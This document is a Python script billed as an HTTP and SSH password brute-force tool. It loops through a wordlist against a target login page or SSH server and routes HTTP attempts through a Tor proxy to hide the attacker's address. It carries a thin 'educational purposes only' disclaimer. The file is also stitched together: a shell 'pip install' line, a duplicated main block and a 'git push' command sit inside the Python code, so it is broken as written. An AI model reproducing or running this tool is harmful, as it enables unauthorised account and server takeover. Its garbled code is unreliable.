# EslamUltimateForce - Brute Force Tool
# Developed by Eslam Hacker FB
# This tool is for educational purposes only.
# Be responsible and use it ethically in your testing environments.

import requests
import paramiko
import time
import sys
import threading

# Proxychains support (for IP masking)
import os

# Global Variables
USERNAME = "Eslam Hacker FB"  # Disable or remove username field (personalize)
PROXY = "socks4 127.0.0.1 9050"  # Proxy to mask the IP

# Function to perform brute-force on HTTP login
def brute_force_http(url, wordlist):
    """
    Function to attempt brute force on an HTTP login page
    :param url: URL of the login page (e.g., http://example.com/login)
    :param wordlist: Path to the wordlist file containing passwords
    """
    with open(wordlist, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()  # Remove any trailing spaces
        try:
            response = requests.post(url, data={'username': USERNAME, 'password': password}, proxies={'http': PROXY})
            if "login successful" in response.text.lower():
                print(f"Password found for {USERNAME}: {password}")
                break
        except requests.exceptions.RequestException as e:
            print(f"Error with the request: {e}")
            continue

# Function to perform brute-force on SSH login
def brute_force_ssh(ip, username, wordlist):
    """
    Function to attempt brute force on an SSH server
    :param ip: Target IP address (e.g., 192.168.1.1)
    :param username: SSH username
    :param wordlist: Path to the wordlist file containing passwords
    """
    with open(wordlist, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()  # Remove any trailing spaces
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=password)
            print(f"Password found for {username}: {password}")
            client.close()
            break
        except paramiko.AuthenticationException:
            print(f"Invalid password for {username}: {password}")
            continue
        except Exception as e:
            print(f"Error with the SSH connection: {e}")
            continue

# Main function to start the brute-force attack
def start_attack():
    print("Welcome to EslamUltimateForce Brute-Force Tool!")
    print("-------------------------------------------------")
    attack_type = input("Choose attack type (HTTP or SSH): ").strip().lower()

    wordlist = input("Enter path to wordlist file: ").strip()

    if attack_type == "http":
        url = input("Enter target HTTP login URL: ").strip()
        brute_force_http(url, wordlist)
    elif attack_type == "ssh":
        ip = input("Enter target IP address: ").strip()
        username = input("Enter SSH username: ").strip()
        brute_force_ssh(ip, username, wordlist)
    else:
        print("Invalid attack type chosen. Please choose either HTTP or SSH.")
        sys.exit(1)

if __name__ == "__main__":
    start_attack()
pip install pillow
from PIL import Image

# Welcome Message with colorful eyes design
def display_welcome_message():
    print("\033[1;32;40m")  # Set terminal text to green
    image = Image.open('path_to_your_image.png')  # Make sure to put the image path here
    image.show()
    print("\033[1;37;40m")  # Reset terminal text color
    print("\033[1;34mWelcome to EslamUltimateForce by Eslam Hacker FB \033[0m")

# Use this in the main function to show the image and text
if __name__ == "__main__":
    display_welcome_message()
    start_attack()
git push -u origin master
